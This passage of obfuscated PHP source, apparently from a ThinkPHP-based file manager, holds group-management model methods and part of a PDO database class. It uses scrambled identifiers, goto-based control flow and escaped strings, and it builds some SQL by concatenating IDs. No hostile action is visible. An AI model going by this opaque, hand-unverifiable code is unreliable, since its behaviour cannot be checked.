$AÉäíîî˜ª[$b†õ¶é…¼Ø[2066]] . $b†õ¶é…¼Ø[47]; } $b †œ†È×§ = array($b†õ¶é…¼Ø[529] => array($b†õ¶é…¼Ø[487], $AÔñ›Ê…ç[$b†õ¶é…¼Ø[463]] . $AÔñ›Ê…ç[$b†õ¶é…¼Ø[2066]] . $b†õ¶é…¼Ø[488])); $d¶…§°¿Üï = array($b†õ¶é…¼Ø[529] => array($b†õ¶é…¼Ø[538], "\162\x65\x70\x6c\x61\143\145\x28\x70\x61\162\145\x6e\164\x4c\145\x76\x65\154\54\47{$BïôÔ–Á©¶}\47\54\47{$EÖ—óÙĞí}\x27\51")); goto D†®Ğ”åÒ; bŒİÆßƒî³: } public function setNamePinyin($eñÄàïá¢Î, $F®„©ø®ÄŒ = false) { $cßÜ½Ê…£ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$F®„©ø®ÄŒ) { $bˆâÌ­óô = $this->getInfoSimple($eñÄàïá¢Î); $F®„©ø®ÄŒ = $bˆâÌ­óô[$cßÜ½Ê…£[28]]; } if (!Input::check($F®„©ø®ÄŒ, $cßÜ½Ê…£[532])) { $this->metaSet($eñÄàïá¢Î, $cßÜ½Ê…£[420], null); $this->metaSet($eñÄàïá¢Î, $cßÜ½Ê…£[419], null); return; } $C¢”–”‡Åè = array($cßÜ½Ê…£[420] => str_replace($cßÜ½Ê…£[50], $cßÜ½Ê…£[33], Pinyin::encode($F®„©ø®ÄŒ)), $cßÜ½Ê…£[419] => Pinyin::encode($F®„©ø®ÄŒ, $cßÜ½Ê…£[533])); $this->metaSet($eñÄàïá¢Î, $C¢”–”‡Åè); } protected function groupStatus($e±îëóåøä, $cÅî¥…éÂ´, $EïÏñÚ«œî = true) { $f§¾³å— =& $_SERVER[ºÖÙÂŒäÉê‡]; $e±å°Şâ¼± = $this->getInfoSimple($e±îëóåøä); if (!$e±å°Şâ¼±) { return !1; } if ($EïÏñÚ«œî) { $this->_groupStatusApply($e±å°Şâ¼±, $cÅî¥…éÂ´); } $dì‚îĞæÚš = array($f§¾³å—[2066] => $e±îëóåøä, $f§¾³å—[89] => $f§¾³å—[686], $f§¾³å—[364] => $cÅî¥…éÂ´); return Model($f§¾³å—[2139])->add($dì‚îĞæÚš, array(), !0); } private function _groupStatusApply($D‹°ÏÖ®ôÖ, $fØ«¿«¡‘¿) { $d¸ÛÎÜ‹ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($fØ«¿«¡‘¿ == $d¸ÛÎÜ‹[83]) { $aÎ×¤°ƒ­ = $this->parentLevelArray($D‹°ÏÖ®ôÖ[$d¸ÛÎÜ‹[463]]); } else { $a”Š­î­Íè = array($d¸ÛÎÜ‹[529] => array($d¸ÛÎÜ‹[487], $D‹°ÏÖ®ôÖ[$d¸ÛÎÜ‹[463]] . $D‹°ÏÖ®ôÖ[$d¸ÛÎÜ‹[2066]] . $d¸ÛÎÜ‹[488])); $aÎ×¤°ƒ­ = $this->where($a”Š­î­Íè)->field($d¸ÛÎÜ‹[2066])->select(); $aÎ×¤°ƒ­ = array_to_keyvalue($aÎ×¤°ƒ­, $d¸ÛÎÜ‹[33], $d¸ÛÎÜ‹[2066]); } if (empty($aÎ×¤°ƒ­)) { return; } $a”Š­î­Íè = array($d¸ÛÎÜ‹[2066] => array($d¸ÛÎÜ‹[7], $aÎ×¤°ƒ­), $d¸ÛÎÜ‹[89] => $d¸ÛÎÜ‹[686], $d¸ÛÎÜ‹[364] => $fØ«¿«¡‘¿ ? $d¸ÛÎÜ‹[472] : $d¸ÛÎÜ‹[83]); Model($d¸ÛÎÜ‹[2139])->where($a”Š­î­Íè)->save(array($d¸ÛÎÜ‹[364] => $fØ«¿«¡‘¿)); } protected function groupRemove($e§Ûô¾ŒñÅ) { goto d“âÌæäŠæ; fÚ°ñë·½: Model($cÕ´õíî½[751])->groupRootRemove($e§Ûô¾ŒñÅ); return $this->where($a÷ â”Ğåğ)->delete(); goto Cã†Åš²©³; Câœ¾Ê©Ÿ™: $this->where(array($cÕ´õíî½[465] => $e§Ûô¾ŒñÅ))->save(array($cÕ´õíî½[465] => $aÔîà«‡®[$cÕ´õíî½[465]])); Model($cÕ´õíî½[2139])->where($a÷ â”Ğåğ)->delete(); Model($cÕ´õíî½[2140])->where($a÷ â”Ğåğ)->delete(); goto fÚ°ñë·½; d“âÌæäŠæ: $cÕ´õíî½ =& $_SERVER[ºÖÙÂŒäÉê‡]; $a÷ â”Ğåğ = array($cÕ´õíî½[2066] => $e§Ûô¾ŒñÅ); $aÔîà«‡® = $this->where($a÷ â”Ğåğ)->find(); goto b™§ùøÍß; b™§ùøÍß: if (!$aÔîà«‡® || $aÔîà«‡®[$cÕ´õíî½[465]] == 0) { return !1; } $c÷ÑççÓ¦ = $this->getInfoSimple($aÔîà«‡®[$cÕ´õíî½[465]]); $this->_changeChildLevel($aÔîà«‡®, $c÷ÑççÓ¦, !0); goto Câœ¾Ê©Ÿ™; Cã†Åš²©³: } public function listData() { $C÷”‹ç “š = $this->_makeOrder()->selectPage(50); $this->_listDataApply($C÷”‹ç “š[$_SERVER[ºÖÙÂŒäÉê‡][359]]); return $C÷”‹ç “š; } private function _makeOrder($e–Ç¯ï–Ş¹ = '') { goto d·¡°¸¿éõ; eŸ—¥¹ã©Û: $e–Ç¯ï–Ş¹ = $e–Ç¯ï–Ş¹ . "{$b¡»¨÷ÇÏ}\40{$cÕÇèã‹ˆ˜}\54\x20\x67\162\x6f\165\160\111\x44\40\x61\163\143"; return $this->order($e–Ç¯ï–Ş¹); goto cÉê®‘÷ˆŒ; aø¤í¤ÏĞ£: $b¡»¨÷ÇÏ = Input::get($cÌ‡äóÈß[411], $cÌ‡äóÈß[7], $cÌ‡äóÈß[2070], $Eí‰Â¥ÛÔ­); $cÕÇèã‹ˆ˜ = Input::get($cÌ‡äóÈß[412], $cÌ‡äóÈß[7], $cÌ‡äóÈß[2141], array($cÌ‡äóÈß[2141], $cÌ‡äóÈß[408])); $cÕÇèã‹ˆ˜ = $FÛ³àÙÕĞƒ[$cÕÇèã‹ˆ˜]; goto eŸ—¥¹ã©Û; d·¡°¸¿éõ: $cÌ‡äóÈß =& $_SERVER[ºÖÙÂŒäÉê‡]; $Eí‰Â¥ÛÔ­ = array($cÌ‡äóÈß[2066], $cÌ‡äóÈß[28], $cÌ‡äóÈß[2052], $cÌ‡äóÈß[193]); $FÛ³àÙÕĞƒ = array($cÌ‡äóÈß[406] => $cÌ‡äóÈß[407], $cÌ‡äóÈß[408] => $cÌ‡äóÈß[409]); goto aø¤í¤ÏĞ£; cÉê®‘÷ˆŒ: } public function listChild($fØ±óîÕ„‚) { $FçÜÄÕˆŠ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fî×ØÃ­Ãœ = $this->where(array($FçÜÄÕˆŠ[465] => $fØ±óîÕ„‚))->_makeOrder()->selectPage(200); $this->_listDataApply($fî×ØÃ­Ãœ[$FçÜÄÕˆŠ[359]]); return $fî×ØÃ­Ãœ; } public function listByID($CÇõòÚà®Ú) { $cùŠ¿¾ÖÛè =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$CÇõòÚà®Ú) { return array(); } $bøˆŠÅèº = array($cùŠ¿¾ÖÛè[2066] => array($cùŠ¿¾ÖÛè[7], $CÇõòÚà®Ú)); $A‚¡Ë‡ ¼ = $this->where($bøˆŠÅèº)->select(); $this->_listDataApply($A‚¡Ë‡ ¼); return $A‚¡Ë‡ ¼; } public function listSearch($dŠå§–À„¯) { goto Då°ÀåĞî; Då°ÀåĞî: $e­‚¡¿øÔ÷ =& $_SERVER[ºÖÙÂŒäÉê‡]; $BéÃ¾æ¨  = $dŠå§–À„¯[$e­‚¡¿øÔ÷[2142]]; $DœÏ™äÖòÅ = isset($dŠå§–À„¯[$e­‚¡¿øÔ÷[2143]]) ? $dŠå§–À„¯[$e­‚¡¿øÔ÷[2143]] : !1; goto a¦¢¾«­åä; AñÅ”©´ïŸ: $FÙ›Í‰ñ–Å = $this->_makeOrder()->where($c‘Ùèˆˆ‰ø)->selectPage(20); $FÙ›Í‰ñ–Å = $FÙ›Í‰ñ–Å ? $FÙ›Í‰ñ–Å : array(); if (!$FÙ›Í‰ñ–Å || count($FÙ›Í‰ñ–Å[$e­‚¡¿øÔ÷[359]]) < 5 && Input::check($BéÃ¾æ¨ , $e­‚¡¿øÔ÷[311])) { $C¯Å‡³ó©Œ = $this->_searchFromMeta($e­‚¡¿øÔ÷[419], $BéÃ¾æ¨ , 10); $aõîªĞ¹¢¯ = $this->_searchFromMeta($e­‚¡¿øÔ÷[420], $BéÃ¾æ¨ , 10); $AÇªÉáé› = array_merge($C¯Å‡³ó©Œ, $aõîªĞ¹¢¯, $FÙ›Í‰ñ–Å[$e­‚¡¿øÔ÷[359]]); $FÙ›Í‰ñ–Å[$e­‚¡¿øÔ÷[359]] = array_unique_by_key($AÇªÉáé›, $e­‚¡¿øÔ÷[2066]); $FÙ›Í‰ñ–Å[$e­‚¡¿øÔ÷[356]][$e­‚¡¿øÔ÷[357]] = count($FÙ›Í‰ñ–Å[$e­‚¡¿øÔ÷[359]]); $FÙ›Í‰ñ–Å[$e­‚¡¿øÔ÷[356]][$e­‚¡¿øÔ÷[358]] = ceil($FÙ›Í‰ñ–Å[$e­‚¡¿øÔ÷[356]][$e­‚¡¿øÔ÷[357]] / $FÙ›Í‰ñ–Å[$e­‚¡¿øÔ÷[356]][$e­‚¡¿øÔ÷[354]]); } goto FËµÏÛÊÓ¢; a¦¢¾«­åä: if (!trim($BéÃ¾æ¨ )) { return !1; } $BéÃ¾æ¨  = str_replace($e­‚¡¿øÔ÷[2144], $e­‚¡¿øÔ÷[2145], $BéÃ¾æ¨ ); $c‘Ùèˆˆ‰ø = array($e­‚¡¿øÔ÷[2066] => array($e­‚¡¿øÔ÷[750], "\x25{$BéÃ¾æ¨ }\45"), $e­‚¡¿øÔ÷[28] => array($e­‚¡¿øÔ÷[750], "\45{$BéÃ¾æ¨ }\45"), $e­‚¡¿øÔ÷[906] => $e­‚¡¿øÔ÷[2146]); goto AñÅ”©´ïŸ; FËµÏÛÊÓ¢: $this->_listDataApply($FÙ›Í‰ñ–Å[$e­‚¡¿øÔ÷[359]]); return $FÙ›Í‰ñ–Å; goto a•‹‘œ¶¹ñ; a•‹‘œ¶¹ñ: } private function _searchFromMeta($eĞƒ®îøàÍ, $F¶Üõ½Š…í, $c„Ñ²Åİà) { goto døëŞÙÕ½; cŠÈæŠŞ¨æ: $b‰Íêø¼Áƒ = $this->where(array($b„Öçõ·Æİ[2138] => array($b„Öçõ·Æİ[7], $Fõë´ó“äè)))->select(); if (!$b‰Íêø¼Áƒ) { return array(); } return $b‰Íêø¼Áƒ; goto ağ’ğÕƒÃÙ; E›èÂ´ÄŠ: $Fõë´ó“äè = Model($b„Öçõ·Æİ[2147])->where($f…áñóÖò)->limit($c„Ñ²Åİà)->select(); if (!$Fõë´ó“äè) { return array(); } $Fõë´ó“äè = array_to_keyvalue($Fõë´ó“äè, $b„Öçõ·Æİ[33], $b„Öçõ·Æİ[2066]); goto cŠÈæŠŞ¨æ; døëŞÙÕ½: $b„Öçõ·Æİ =& $_SERVER[ºÖÙÂŒäÉê‡]; $F¶Üõ½Š…í = strtolower($F¶Üõ½Š…í); $f…áñóÖò = array($b„Öçõ·Æİ[89] => $eĞƒ®îøàÍ, $b„Öçõ·Æİ[364] => array($b„Öçõ·Æİ[750], "\45{$F¶Üõ½Š…í}\x25")); goto E›èÂ´ÄŠ; ağ’ğÕƒÃÙ: } protected function _listDataApplyItem($F‹›‹æàÕ) { $bá×ïóœæ = array($F‹›‹æàÕ); $this->_listDataApply($bá×ïóœæ); return $bá×ïóœæ[0]; } protected function _listDataApply(&$b†èÁ·†•) { goto AÏÜÎ™Ê; cÍç«èö‘é: $this->_listAppendParent($b†èÁ·†•); $this->_listAppendSourceRoot($b†èÁ·†•, $aîÛ•šª–ö); goto EÆÙÇë¹Éå; AÏÜÎ™Ê: $Eˆø¨ö™¿ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$b†èÁ·†•) { return; } $aîÛ•šª–ö = array_to_keyvalue($b†èÁ·†•, $Eˆø¨ö™¿[33], $Eˆø¨ö™¿[2066]); goto DĞì·‰˜Â¾; DĞì·‰˜Â¾: $this->_listAppendChildren($b†èÁ·†•); $this->_listAppendChildrenMember($b†èÁ·†•); $this->_listAppendMeta($b†èÁ·†•, $aîÛ•šª–ö); goto cÍç«èö‘é; EÆÙÇë¹Éå: } private function _listAppendChildren(&$EøòÁöĞ»æ) { goto fø‰Ï³¤Û; fø‰Ï³¤Û: $DÌµãÔóŞ =& $_SERVER[ºÖÙÂŒäÉê‡]; $BĞç‚­‹è¾ = $DÌµãÔóŞ[366]; $C¼Ìñ—’½» = array(); goto bª»Ğì»É; A†êğò¬í¥: $C¼Ìñ—’½» = array_to_keyvalue($C¼Ìñ—’½», $DÌµãÔóŞ[454]); foreach ($EøòÁöĞ»æ as &$f¦“Åƒ…¬‰) { $f¦“Åƒ…¬‰[$DÌµãÔóŞ[2148]] = isset($C¼Ìñ—’½»[$f¦“Åƒ…¬‰[$DÌµãÔóŞ[2066]] . $DÌµãÔóŞ[2149]]); } goto Eù¶ß‚™ó…; bª»Ğì»É: $aºÜ­µêÏ = count($EøòÁöĞ»æ); $d½ÊŒÁÇ‡  = $this->tablePrefix . $this->tableName; for ($c˜å¶‹ÆÈ³ = 0, $cµáîÂ«Í› = 0; $c˜å¶‹ÆÈ³ < $aºÜ­µêÏ; $c˜å¶‹ÆÈ³++) { $cµáîÂ«Í›++; $CŠÈ‰Õ»Ø = $EøòÁöĞ»æ[$c˜å¶‹ÆÈ³][$DÌµãÔóŞ[2066]]; $BĞç‚­‹è¾ .= "\123\105\x4c\105\103\124\x20\x2a\40\106\122\117\115\40\50\123\x45\114\x45\x43\x54\40\47{$CŠÈ‰Õ»Ø}\137\x63\x68\151\154\x64\x27\x20\x61\x73\40\x68\x61\x73\x20\x46\x52\117\x4d\40\x60{$d½ÊŒÁÇ‡ }\140\40\x77\x68\x65\162\145\40\x70\141\x72\x65\x6e\x74\x49\x44\x3d{$CŠÈ‰Õ»Ø}\40\x6c\x69\x6d\151\x74\40\61\x29\40\x61\x73\40\164\142\137{$CŠÈ‰Õ»Ø}\x20\165\x6e\x69\157\156\x20\x61\154\x6c\40"; if (($cµáîÂ«Í› >= 20 || $c˜å¶‹ÆÈ³ == $aºÜ­µêÏ - 1) && $BĞç‚­‹è¾) { $BĞç‚­‹è¾ = substr($BĞç‚­‹è¾, 0, -strlen($DÌµãÔóŞ[453])); $c ô¹“à— = $this->query($BĞç‚­‹è¾); $C¼Ìñ—’½» = array_merge($C¼Ìñ—’½», $c ô¹“à—); $cµáîÂ«Í› = 0; $BĞç‚­‹è¾ = $DÌµãÔóŞ[33]; } } goto A†êğò¬í¥; Eù¶ß‚™ó…: } private function _listAppendChildrenMember(&$añ­¿òùï) { goto B˜ÄŞ‹ºÂ; fˆ°—‡Öùõ: $dœ‚­â’Šá = array_to_keyvalue($dœ‚­â’Šá, $dÖ¬Ô»º¹½[454]); foreach ($añ­¿òùï as &$fÇƒ´·ØÌñ) { $fÇƒ´·ØÌñ[$dÖ¬Ô»º¹½[2150]] = isset($dœ‚­â’Šá[$fÇƒ´·ØÌñ[$dÖ¬Ô»º¹½[2066]] . $dÖ¬Ô»º¹½[2149]]); } goto CÃÕª¢ò£; B˜ÄŞ‹ºÂ: $dÖ¬Ô»º¹½ =& $_SERVER[ºÖÙÂŒäÉê‡]; $EøËƒ†™·» = $dÖ¬Ô»º¹½[366]; $dœ‚­â’Šá = array(); goto b½ÊèŒäè ; b½ÊèŒäè : $F“á×š“‹ = count($añ­¿òùï); $bæ‡ö³Èğ§ = $this->tablePrefix . $dÖ¬Ô»º¹½[2140]; for ($DåÒ£çïÀ = 0, $d·Ççëù¡± = 0; $DåÒ£çïÀ < $F“á×š“‹; $DåÒ£çïÀ++) { $d·Ççëù¡±++; $fÔôô˜Ú”ƒ = $añ­¿òùï[$DåÒ£çïÀ][$dÖ¬Ô»º¹½[2066]]; $EøËƒ†™·» .= "\x53\105\x4c\x45\103\124\40\52\x20\x46\122\x4f\115\x20\x28\123\x45\x4c\x45\103\x54\x20\x27{$fÔôô˜Ú”ƒ}\x5f\143\x68\151\x6c\144\x27\40\141\x73\40\150\141\163\x20\x46\x52\x4f\x4d\x20\140{$bæ‡ö³Èğ§}\x60\40\x77\150\x65\x72\145\x20\147\x72\x6f\x75\160\x49\104\75{$fÔôô˜Ú”ƒ}\x20\154\151\x6d\x69\164\40\61\x29\40\141\x73\40\164\x62\137{$fÔôô˜Ú”ƒ}\40\165\156\x69\x6f\156\40\x61\x6c\x6c\40"; if (($d·Ççëù¡± >= 20 || $DåÒ£çïÀ == $F“á×š“‹ - 1) && $EøËƒ†™·») { $EøËƒ†™·» = substr($EøËƒ†™·», 0, -strlen($dÖ¬Ô»º¹½[453])); $eØÕ÷íä = $this->query($EøËƒ†™·»); $dœ‚­â’Šá = array_merge($dœ‚­â’Šá, $eØÕ÷íä); $d·Ççëù¡± = 0; $EøËƒ†™·» = $dÖ¬Ô»º¹½[33]; } } goto fˆ°—‡Öùõ; CÃÕª¢ò£: } private function _listAppendMeta(&$A«ô…Š…¾», $bµÊ¬çŞØº) { $dŞ†´ÈÏĞë =& $_SERVER[ºÖÙÂŒäÉê‡]; $a†è·¬ì“İ = array($dŞ†´ÈÏĞë[2066] => array($dŞ†´ÈÏĞë[7], $bµÊ¬çŞØº)); $fœÆŸìµ½ = Model($dŞ†´ÈÏĞë[2139])->where($a†è·¬ì“İ)->select(); $fœÆŸìµ½ = array_to_keyvalue_group($fœÆŸìµ½, $dŞ†´ÈÏĞë[2066]); foreach ($fœÆŸìµ½ as &$cĞÔçˆ¦ÒÑ) { $cĞÔçˆ¦ÒÑ = array_to_keyvalue($cĞÔçˆ¦ÒÑ, $dŞ†´ÈÏĞë[89], $dŞ†´ÈÏĞë[364]); } foreach ($A«ô…Š…¾» as &$cÑ”‚´äÂì) { $cÑ”‚´äÂì[$dŞ†´ÈÏĞë[421]] = array(); if (isset($fœÆŸìµ½[$cÑ”‚´äÂì[$dŞ†´ÈÏĞë[2066]]])) { $cÑ”‚´äÂì[$dŞ†´ÈÏĞë[421]] = $fœÆŸìµ½[$cÑ”‚´äÂì[$dŞ†´ÈÏĞë[2066]]]; } } } protected function parentLevelArray($d©™áÒ¦Š) { $FøİÜ‹ïˆÅ =& $_SERVER[ºÖÙÂŒäÉê‡]; $d©™áÒ¦Š = explode($FøİÜ‹ïˆÅ[47], trim($d©™áÒ¦Š, $FøİÜ‹ïˆÅ[47])); $d©™áÒ¦Š = array_remove_value($d©™áÒ¦Š, $FøİÜ‹ïˆÅ[472]); return $d©™áÒ¦Š; } private function _listAppendParent(&$aˆØÂŠò„ì) { goto e¦ê—ğÍ„; e¦ê—ğÍ„: $a…Êì‚å‰é =& $_SERVER[ºÖÙÂŒäÉê‡]; $DÔ×É“µ¸î = array(); foreach ($aˆØÂŠò„ì as &$Dì¹Æ‹ğÒ) { $DÔ×É“µ¸î[$Dì¹Æ‹ğÒ[$a…Êì‚å‰é[2066]]] = $Dì¹Æ‹ğÒ[$a…Êì‚å‰é[28]]; $Aë…À‰š¢ = $this->parentLevelArray($Dì¹Æ‹ğÒ[$a…Êì‚å‰é[463]]); foreach ($Aë…À‰š¢ as $CÌ«£éØÛ) { if (!isset($DÔ×É“µ¸î[$CÌ«£éØÛ])) { $DÔ×É“µ¸î[$CÌ«£éØÛ] = 0; } } } goto Cğ©£ë®êÑ; c‡˜Œôœ¢ò: foreach ($aˆØÂŠò„ì as &$Dì¹Æ‹ğÒ) { $Aë…À‰š¢ = $this->parentLevelArray($Dì¹Æ‹ğÒ[$a…Êì‚å‰é[463]]); $bÅ›ßŒ›Š… = $a…Êì‚å‰é[33]; foreach ($Aë…À‰š¢ as $CÌ«£éØÛ) { $bÅ›ßŒ›Š… .= $DÔ×É“µ¸î[$CÌ«£éØÛ] . $a…Êì‚å‰é[8]; } if ($Aë…À‰š¢) { $bÅ›ßŒ›Š… .= $Dì¹Æ‹ğÒ[$a…Êì‚å‰é[28]]; } $Dì¹Æ‹ğÒ[$a…Êì‚å‰é[467]] = str_replace($a…Êì‚å‰é[471], $a…Êì‚å‰é[8], $bÅ›ßŒ›Š…); } goto cµõŒöæíŞ; Cğ©£ë®êÑ: $A†Öğî¿ö¬ = array(); foreach ($DÔ×É“µ¸î as $B¢”¡·Õ†¢ => $Fïİ©á–‹…) { if (!$Fïİ©á–‹…) { $A†Öğî¿ö¬[] = $B¢”¡·Õ†¢; } } if ($A†Öğî¿ö¬) { $Eš‡òÙá› = array($a…Êì‚å‰é[2138] => array($a…Êì‚å‰é[389], $A†Öğî¿ö¬)); $A›áˆ‘½ = $this->field($a…Êì‚å‰é[2151])->where($Eš‡òÙá›)->select(); $d‹ù³Ñ¥ = array_to_keyvalue($A›áˆ‘½, $a…Êì‚å‰é[2066], $a…Êì‚å‰é[28]); $DÔ×É“µ¸î = array_merge_index($DÔ×É“µ¸î, $d‹ù³Ñ¥); } goto c‡˜Œôœ¢ò; cµõŒöæíŞ: } private function _listAppendSourceRoot(&$CÚòôÓ­ï·, $Aø±ñ­ƒ•Ú) { goto DĞí‰¾½åÉ; e¿à¶×ƒØ¯: $EÅÀ¥Î¢¶“ = Model($d¨¾Ç‹¯í [751])->order($d¨¾Ç‹¯í [2153])->field($c†Ôî‹ëÃ)->where($EÌÁŒ‰¥ƒ¼)->select(); $EÅÀ¥Î¢¶“ = array_to_keyvalue($EÅÀ¥Î¢¶“, $d¨¾Ç‹¯í [460]); $EÅÀ¥Î¢¶“ = array_remove_key($EÅÀ¥Î¢¶“, $d¨¾Ç‹¯í [460]); goto eéâä³‡® ; eéâä³‡® : foreach ($CÚòôÓ­ï· as &$EÒÄƒ“’¢ö) { $EÒÄƒ“’¢ö[$d¨¾Ç‹¯í [396]] = $EÅÀ¥Î¢¶“[$EÒÄƒ“’¢ö[$d¨¾Ç‹¯í [2066]]] ? $EÅÀ¥Î¢¶“[$EÒÄƒ“’¢ö[$d¨¾Ç‹¯í [2066]]] : array(); } goto E«Ä·£Şœç; DĞí‰¾½åÉ: $d¨¾Ç‹¯í  =& $_SERVER[ºÖÙÂŒäÉê‡]; $EÌÁŒ‰¥ƒ¼ = array($d¨¾Ç‹¯í [376] => SourceModel::TYPE_GROUP, $d¨¾Ç‹¯í [465] => 0, $d¨¾Ç‹¯í [460] => array($d¨¾Ç‹¯í [7], $Aø±ñ­ƒ•Ú)); $c†Ôî‹ëÃ = $d¨¾Ç‹¯í [2152]; goto e¿à¶×ƒØ¯; E«Ä·£Şœç: } protected function resetParentLevel() { $A¿ºÛ¼Ìì =& $_SERVER[ºÖÙÂŒäÉê‡]; $Aà”‰í®Õ… = $A¿ºÛ¼Ìì[2066]; $B¸Ã ¾Ìô = $this->select(); $B¸Ã ¾Ìô = array_to_keyvalue($B¸Ã ¾Ìô, $Aà”‰í®Õ…); foreach ($B¸Ã ¾Ìô as $bÂ¯‹³¿èé) { goto fÎ‚ñŞ¡Èí; fÎ‚ñŞ¡Èí: $fÇëÖ‹»Ç = $bÂ¯‹³¿èé; $f—†®ÃÅŠ¼ = array(); while ($fÇëÖ‹»Ç[$A¿ºÛ¼Ìì[465]] != 0) { $f—†®ÃÅŠ¼[] = $fÇëÖ‹»Ç[$A¿ºÛ¼Ìì[465]]; $fÇëÖ‹»Ç = $B¸Ã ¾Ìô[$fÇëÖ‹»Ç[$A¿ºÛ¼Ìì[465]]]; } goto añçŞòë; añçŞòë: $f—†®ÃÅŠ¼[] = 0; $f—†®ÃÅŠ¼ = $A¿ºÛ¼Ìì[47] . implode($A¿ºÛ¼Ìì[47], array_reverse($f—†®ÃÅŠ¼)) . $A¿ºÛ¼Ìì[47]; $this->setNamePinyin($bÂ¯‹³¿èé[$Aà”‰í®Õ…], $bÂ¯‹³¿èé[$A¿ºÛ¼Ìì[28]]); goto Fì‚ô‹à¸ƒ; Fì‚ô‹à¸ƒ: $this->where(array($Aà”‰í®Õ… => $bÂ¯‹³¿èé[$Aà”‰í®Õ…]))->save(array($A¿ºÛ¼Ìì[529] => $f—†®ÃÅŠ¼)); goto f…ÛöÓÚ‚Õ; f…ÛöÓÚ‚Õ: } return $B¸Ã ¾Ìô; } public function groupNameAuto($A÷æâîàÌ, $B¹°´©Æ» ) { $CŸ÷–“±ŠŞ =& $_SERVER[ºÖÙÂŒäÉê‡]; $D¯º¸Š°Š· = $this->where(array($CŸ÷–“±ŠŞ[373] => $A÷æâîàÌ))->getField($CŸ÷–“±ŠŞ[28], !0); if (!$D¯º¸Š°Š· || !in_array($B¹°´©Æ» , $D¯º¸Š°Š·)) { return $B¹°´©Æ» ; } for ($c›«ÏçóİÁ = 1; $c›«ÏçóİÁ <= count($D¯º¸Š°Š·) + 1; $c›«ÏçóİÁ++) { $F‰æ·—„ØŞ = $B¹°´©Æ»  . "\50{$c›«ÏçóİÁ}\x29"; if (!in_array($F‰æ·—„ØŞ, $D¯º¸Š°Š·)) { return $F‰æ·—„ØŞ; } } } } goto dÁæ·õ³æ¿; eõØ™ÒÏ‚: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($eƒíŒ¨Ìçº = '') { $dÁÃÆ‚É‘ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!class_exists($dÁÃÆ‚É‘[818])) { think_exception(think_lang($dÁÃÆ‚É‘[10]) . $dÁÃÆ‚É‘[819]); } if (!empty($eƒíŒ¨Ìçº)) { $this->config = $eƒíŒ¨Ìçº; if (empty($this->config[$dÁÃÆ‚É‘[13]])) { $this->config[$dÁÃÆ‚É‘[13]] = array(); } } } public function connect($AÆšª…·ñæ = '', $aÕ‰‰‚ƒî¥ = 0) { $DÖ®˜“Ä‡Ä =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!isset($this->linkID[$aÕ‰‰‚ƒî¥])) { goto eãùåâ„Õ; dà‹‘˜äÂŸ: $this->dbType = $this->_getDsnType($AÆšª…·ñæ[$DÖ®˜“Ä‡Ä[820]]); if (in_array($this->dbType, array($DÖ®˜“Ä‡Ä[821], $DÖ®˜“Ä‡Ä[822], $DÖ®˜“Ä‡Ä[823], $DÖ®˜“Ä‡Ä[824]))) { think_exception($DÖ®˜“Ä‡Ä[825] . $this->dbType . $DÖ®˜“Ä‡Ä[826] . $this->dbType . $DÖ®˜“Ä‡Ä[827]); } if (!$this->linkID[$aÕ‰‰‚ƒî¥]) { think_exception($DÖ®˜“Ä‡Ä[828]); } goto cİ°„ œ¸; cİ°„ œ¸: $this->linkID[$aÕ‰‰‚ƒî¥]->exec($DÖ®˜“Ä‡Ä[829] . think_config($DÖ®˜“Ä‡Ä[796])); $this->connected = !0; if (1 != think_config($DÖ®˜“Ä‡Ä[18])) { unset($this->config); } goto CÖ¸†Åà„†; eãùåâ„Õ: if (empty($AÆšª…·ñæ)) { $AÆšª…·ñæ = $this->config; } if ($this->pconnect) { $AÆšª…·ñæ[$DÖ®˜“Ä‡Ä[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$aÕ‰‰‚ƒî¥] = new PDO($AÆšª…·ñæ[$DÖ®˜“Ä‡Ä[820]], $AÆšª…·ñæ[$DÖ®˜“Ä‡Ä[793]], $AÆšª…·ñæ[$DÖ®˜“Ä‡Ä[794]], $AÆšª…·ñæ[$DÖ®˜“Ä‡Ä[13]]); } catch (PDOException $Bç‹¤‘İË¡) { think_exception($Bç‹¤‘İË¡->getMessage()); } goto dà‹‘˜äÂŸ; CÖ¸†Åà„†: } return $this->linkID[$aÕ‰‰‚ƒî¥]; } public function free() { $this->PDOStatement = null; } public function query($E„çğ“Úˆ‘, $A•ÎÈØ®Ó÷ = array()) { goto aßŞô£‚—; fŒĞêƒÔ‘Õ: think_action_status($E˜—¶µÙÅ„[19], 1); think_status($E˜—¶µÙÅ„[20]); $this->PDOStatement = $this->_linkID->prepare($E„çğ“Úˆ‘); goto EÔºï‚Ÿ„ø; EÔºï‚Ÿ„ø: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $d’àì ‘ÊÍ = $this->PDOStatement->execute($A•ÎÈØ®Ó÷); $this->debug(); goto cÌí•ĞóÈ; cíï‘¶ìÀ™: $this->queryStr = $E„çğ“Úˆ‘; if (!empty($A•ÎÈØ®Ó÷)) { $this->queryStr .= $E˜—¶µÙÅ„[830] . print_r($A•ÎÈØ®Ó÷, !0) . $E˜—¶µÙÅ„[831]; } if (!empty($this->PDOStatement)) { $this->free(); } goto fŒĞêƒÔ‘Õ; aßŞô£‚—: $E˜—¶µÙÅ„ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto cíï‘¶ìÀ™; cÌí•ĞóÈ: if (!1 === $d’àì ‘ÊÍ) { $this->error(); return !1; } else { return $this->getAll(); } goto B È¸Ñ›Ì; B È¸Ñ›Ì: } public function execute($dñ•½Ëø”, $dÈ´Ï‚ğÉƒ = array()) { goto CºÕ…¨Óêå; CºÕ…¨Óêå: $fóìå¼¤Ÿ£ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Eç÷†œø…; e™ö‚­Ç‡å: $dºáÃƒ‘šß = $this->PDOStatement->execute($dÈ´Ï‚ğÉƒ); $this->debug(); if (!1 === $dºáÃƒ‘šß) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($B÷ã¯»š·’ || preg_match($fóìå¼¤Ÿ£[836], $dñ•½Ëø”)) { $this->lastInsID = $this->getLastInsertId(); } 